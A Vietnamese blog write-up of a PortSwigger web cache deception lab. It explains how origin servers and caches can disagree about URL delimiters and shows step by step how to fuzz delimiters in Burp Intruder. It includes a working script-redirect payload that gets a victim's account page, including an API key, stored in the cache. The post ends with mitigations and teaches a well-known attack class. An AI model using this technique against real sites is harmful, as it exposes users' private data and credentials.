---
title: "Web Cache Deception: Khai thác Delimiter Discrepancies để đánh cắp dữ liệu nhạy cảm"
date: 2026-03-23T16:04:00
tags:
  - web-cache-deception
  - portswigger
  - burp-suite
  - owasp
categories:
  - PortSwigger Lab
  - writeups
draft: false
---

## Mở đầu

Tiếp nối bài trước về **Path Mapping Discrepancies**, hôm nay mình tackle bài lab thứ hai trong series Web Cache Deception của PortSwigger: **Exploiting Path Delimiters for Web Cache Deception**.

Nếu bài trước khai thác sự khác biệt trong cách *map URL đến resource*, thì bài này khai thác sự khác biệt trong cách origin server và cache server hiểu **ký tự phân tách (delimiter)** trong URL path. Cùng một URL mà hai bên hiểu hai kiểu khác nhau — đó là lúc hacker mỉm cười.

**Lab:** [Exploiting path delimiters for web cache deception](https://portswigger.net/web-security/web-cache-deception/lab-wcd-exploiting-path-delimiters)
**Mức độ:** Practitioner
**Phân loại OWASP:** A05:2021 — Security Misconfiguration

---

## Lý thuyết: Delimiter Discrepancies là gì?

### Delimiter trong URL

Delimiter (ký tự phân tách) là các ký tự đặc biệt dùng để phân chia các phần khác nhau trong URL. Ví dụ quen thuộc nhất là `?` — ngăn cách path và query string:

```
https://example.com/profile?tab=settings
                           ^
                    delimiter phổ biến
```

Vấn đề là: **không phải framework nào cũng dùng chung delimiter**. Cái mà server A coi là "ranh giới", server B có thể coi là "một phần của đường dẫn".

### Ví dụ thực tế

**Java Spring** dùng `;` làm delimiter cho matrix variables:

```
/profile;foo.css
```

- **Origin server (Java Spring):** Cắt tại `;` → xử lý `/profile` → trả dữ liệu profile
- **Cache server (không dùng Java Spring):** Thấy path là `/profile;foo.css` → kết thúc bằng `.css` → cache lại!

**Ruby on Rails** dùng `.` làm delimiter cho response format:

```
/profile.ico
```

- **Origin server (Rails):** `.ico` không có formatter riêng → dùng HTML formatter mặc định → trả profile data
- **Cache server:** Thấy file `.ico` → tĩnh rồi, cache thôi!

**OpenLiteSpeed** dùng `%00` (encoded null) làm delimiter:

```
/profile%00foo.js
```

- **Origin server (OpenLiteSpeed):** Cắt tại `%00` → xử lý `/profile`
- **Cache server (Akamai/Fastly):** Thấy path kết thúc `.js` → cache!

### Tóm tắt pattern

```
Attacker craft URL:  /sensitive-endpoint[DELIMITER]random.static-ext

Origin server:       Cắt tại [DELIMITER] → trả dữ liệu nhạy cảm
Cache server:        Không nhận ra [DELIMITER] → thấy .static-ext → cache response
```

---

## Thực hành: Giải lab step-by-step

### Mục tiêu

Tìm **API key** của user `carlos` bằng cách khai thác delimiter discrepancy.

**Credentials:** `wiener:peter`
![](static/images/lab-2-delimiters/delimiters-1.webp)

### Bước 1: Xác định target endpoint

Đăng nhập với `wiener:peter`, truy cập `/my-account`. Response chứa API key — đây là dữ liệu nhạy cảm mà ta sẽ "đánh cắp" qua cache.

### Bước 2: Kiểm tra hành vi của origin server

Trước tiên cần hiểu origin server xử lý path như thế nào.

**Thêm path segment:**

```
GET /my-account/abc HTTP/2
```

→ `404 Not Found`. Origin server không tự "rút gọn" path về `/my-account`.

**Tạo response tham chiếu (baseline):**

```
GET /my-accountabc HTTP/2
```

→ Cũng `404 Not Found`. Đây là baseline — bất kỳ ký tự nào chèn giữa `/my-account` và `abc` mà cho `200` thì ký tự đó chính là delimiter.
![](static/images/lab-2-delimiters/delimiters-2.webp)

### Bước 3: Brute-force delimiter bằng Intruder

Gửi request `/my-accountabc` đến **Intruder**, đặt payload position:

```
GET /my-account§§abc HTTP/2
```
![](static/images/lab-2-delimiters/delimiters-3.webp)
#### Danh sách delimiter cần test

PortSwigger cung cấp sẵn [danh sách delimiter](https://portswigger.net/web-security/web-cache-deception/wcd-lab-delimiter-list) cho các bài lab Web Cache Deception. Đây là danh sách đầy đủ các ký tự ASCII đặc biệt:

```
!
"
#
$
%
&
'
(
)
*
+
,
-
.
/
:
;
<
=
>
?
@
[
\
]
^
_
`
{
|
}
~
```

**Cách load vào Burp Intruder (Community Edition):**

1. Trong **Intruder → Payloads → Payload configuration**, chọn **Simple list**
2. Copy danh sách trên, lưu thành file `.txt` (mỗi ký tự một dòng)
3. Click **Load...** để import file
4. **⚠️ Quan trọng:** Kéo xuống **Payload encoding** → **bỏ tick** "URL-encode these characters". Nếu không tắt, Burp sẽ encode `;` thành `%3B` và kết quả sẽ sai.
![](static/images/lab-2-delimiters/delimiters-4.webp)
> **Tip cho Burp Community Edition:** Attack sẽ bị throttle (giới hạn tốc độ) so với bản Pro, nhưng danh sách chỉ có ~30 ký tự nên chạy rất nhanh, không ảnh hưởng.

#### Phân tích kết quả

Sort theo **Status code**:

| Ký tự | Status | Ý nghĩa |
|-------|--------|----------|
| `;`   | 200    | ✅ Delimiter — origin cắt path tại đây |
| `?`   | 200    | ✅ Delimiter — origin cắt path tại đây |
| Còn lại | 404  | ❌ Không phải delimiter |
![](static/images/lab-2-delimiters/delimiters-5.webp)
**Kết luận:** Origin server dùng `;` và `?` làm delimiter.

### Bước 4: Tìm delimiter discrepancy

Bây giờ cần kiểm tra cache server có cũng dùng `;` và `?` làm delimiter không.

**Test `?`:**

```
GET /my-account?abc.js HTTP/2
```

→ Không có `X-Cache` header. Cache cũng coi `?` là delimiter → nó thấy path là `/my-account`, không phải file `.js` → không match cache rule. **Không dùng được.**

**Test `;`:**

```
GET /my-account;abc.js HTTP/2
```

- Lần 1: `X-Cache: miss` → Cache **không** coi `;` là delimiter! Nó thấy path kết thúc bằng `.js` → match cache rule → lưu response.
- Lần 2: `X-Cache: hit` → Xác nhận response đã được cache.
![](static/images/lab-2-delimiters/delimiters-6.webp)
![](static/images/lab-2-delimiters/delimiters-7.webp)

**Bingo! Đây là discrepancy:**

```
┌──────────────────────────────────────────────────────────┐
│              URL: /my-account;abc.js                      │
├──────────────────────────────────────────────────────────┤
│                                                          │
│  Origin server                Cache server               │
│  ─────────────                ────────────               │
│  Cắt tại ";"                  Đọc nguyên path            │
│  → /my-account                → /my-account;abc.js       │
│  → Trả profile data           → Thấy .js → CACHE!       │
│                                                          │
│  ═══════════════════════════════════════════════════════  │
│  KẾT QUẢ: Profile data bị cache như file .js tĩnh       │
└──────────────────────────────────────────────────────────┘
```

### Bước 5: Craft exploit

Vào **Exploit Server**, trong phần Body:

```html
<script>document.location="https://YOUR-LAB-ID.web-security-academy.net/my-account;wcd.js"</script>
```

> **Lưu ý:** Dùng path segment mới (`wcd` thay vì `abc`) để tạo cache key mới, tránh cache trả về response từ session của `wiener`.

Click **Deliver exploit to victim**.
![](static/images/lab-2-delimiters/delimiters-8.webp)

### Bước 6: Thu hoạch

Khi `carlos` click link:

1. Browser gửi `GET /my-account;wcd.js` kèm cookie session của carlos
2. Origin server cắt tại `;` → xử lý `/my-account` → trả profile data (có API key)
3. Cache thấy `.js` → lưu response

Bây giờ ta chỉ cần truy cập cùng URL:

```
https://YOUR-LAB-ID.web-security-academy.net/my-account;wcd.js
```

Cache trả về response chứa **API key của carlos**. Copy và submit → Lab solved! 🎉
![](static/images/lab-2-delimiters/delimiters-9.webp)

---

## Luồng tấn công tổng quan

```
[1] Recon: Tìm endpoint nhạy cảm (/my-account chứa API key)
                    │
                    ▼
[2] Brute-force: Test danh sách delimiter → tìm ra ";" và "?"
                    │
                    ▼
[3] So sánh: Origin dùng ";" là delimiter, cache thì KHÔNG
                    │
                    ▼
[4] Exploit: Craft URL /my-account;wcd.js
                    │
                    ▼
[5] Deliver: Gửi URL cho victim qua exploit server
                    │
                    ▼
[6] Harvest: Truy cập cùng URL → cache trả profile của victim
```

---

## So sánh với bài trước: Path Mapping vs Delimiter

| Tiêu chí | Path Mapping Discrepancy | Delimiter Discrepancy |
|-----------|--------------------------|----------------------|
| Khai thác | Cách map URL → resource | Cách hiểu ký tự phân tách |
| Ví dụ URL | `/my-account/abc.js` | `/my-account;abc.js` |
| Origin hiểu | `/my-account` (REST-style) | `/my-account` (cắt tại `;`) |
| Cache hiểu | `/my-account/abc.js` | `/my-account;abc.js` |
| Kỹ thuật tìm | Thêm path segment | Brute-force delimiter list |

**Điểm chung:** Cả hai đều khai thác sự khác biệt giữa origin và cache trong cách parse URL, rồi "lừa" cache lưu response nhạy cảm dưới dạng file tĩnh.

---

## Nguyên nhân gốc (Root Cause)

1. **Thiếu đồng bộ cấu hình:** Origin server và cache server dùng công nghệ khác nhau, dẫn đến hiểu URL khác nhau.
2. **Cache rule quá rộng:** Cache dựa vào extension (`.js`, `.css`) để quyết định cache, thay vì kiểm tra nội dung response (Content-Type header).
3. **Không validate response trước khi cache:** Cache không kiểm tra xem response có thực sự là static file không.

---

## Cách phòng chống (Mitigations)

### Cho Cache Server
- **Cache theo `Cache-Control` header** thay vì dựa vào file extension
- **Kiểm tra `Content-Type`** của response trước khi cache — nếu là `text/html` thì không cache dù URL kết thúc bằng `.js`
- **Chuẩn hóa URL** trước khi tạo cache key — strip delimiter và các ký tự đặc biệt

### Cho Origin Server
- **Set `Cache-Control: no-store`** cho mọi endpoint chứa dữ liệu nhạy cảm
- **Validate URL path** — reject request có delimiter bất thường trong path
- **Response nhất quán:** Nếu path không hợp lệ, trả `404` thay vì fallback về trang gốc

### Cho Developer
- **Hiểu rõ delimiter behavior** của framework đang dùng (Spring dùng `;`, Rails dùng `.`, v.v.)
- **Test delimiter handling** giữa tất cả các layer (CDN, reverse proxy, app server)
- **Dùng `Vary` header** đúng cách để cache phân biệt response theo user

---

## Key Takeaways

1. **Delimiter không phổ quát** — mỗi framework/server có thể hiểu ký tự đặc biệt khác nhau. `;` là delimiter trong Java Spring nhưng là ký tự bình thường trong hầu hết cache server.

2. **Brute-force là bạn** — PortSwigger cung cấp sẵn danh sách ~30 ký tự delimiter. Kết hợp với Burp Intruder (kể cả Community Edition), việc tìm delimiter chỉ mất vài phút.

3. **`X-Cache` header là chìa khóa** — `miss` nghĩa là cache vừa lưu response mới, `hit` nghĩa là đang trả response từ cache. Hai header này giúp xác nhận exploit hoạt động.

4. **Luôn dùng cache buster** — khi gửi exploit cho victim, dùng path segment mới (ví dụ `wcd` thay vì `abc`) để đảm bảo cache tạo key mới, tránh victim nhận response đã cache từ session của mình.

5. **`?` thường không khai thác được** — vì hầu hết mọi hệ thống đều coi `?` là delimiter. Cần tìm ký tự mà **chỉ origin dùng** nhưng **cache không dùng**.

---

*Bài tiếp theo mình sẽ tiếp tục với các lab Web Cache Deception khác trong series của PortSwigger. Stay tuned!*
